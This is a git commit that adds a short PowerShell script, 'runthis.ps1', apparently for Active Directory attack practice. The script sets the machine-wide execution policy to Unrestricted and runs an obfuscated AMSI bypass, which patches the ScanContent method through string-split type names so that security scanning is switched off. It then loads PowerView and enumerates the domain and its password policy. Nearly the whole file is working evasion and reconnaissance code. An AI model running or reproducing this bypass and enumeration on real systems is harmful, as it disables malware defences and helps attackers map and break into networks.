41f275746dd7da586486ce6fa9cde800a3967d40
voidmango <alton99@gmail.com>
2024-10-31 14:24:54 -0400

    Create runthis.ps1

---
+++ runthis.ps1
@@ -0,0 +1,11 @@
+Set-ExecutionPolicy -Scope LocalMachine Unrestricted
+
+Import-Module C:\AD\Microsoft.ActiveDirectory.Management.dll -Verbose
+Get-ADDomain
+
+class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
+
+Import-Module C:\AD\PowerView.ps1
+
+Get-ADDefaultDomainPasswordPolicy
+(Get-DomainPolicy).SystemAccess
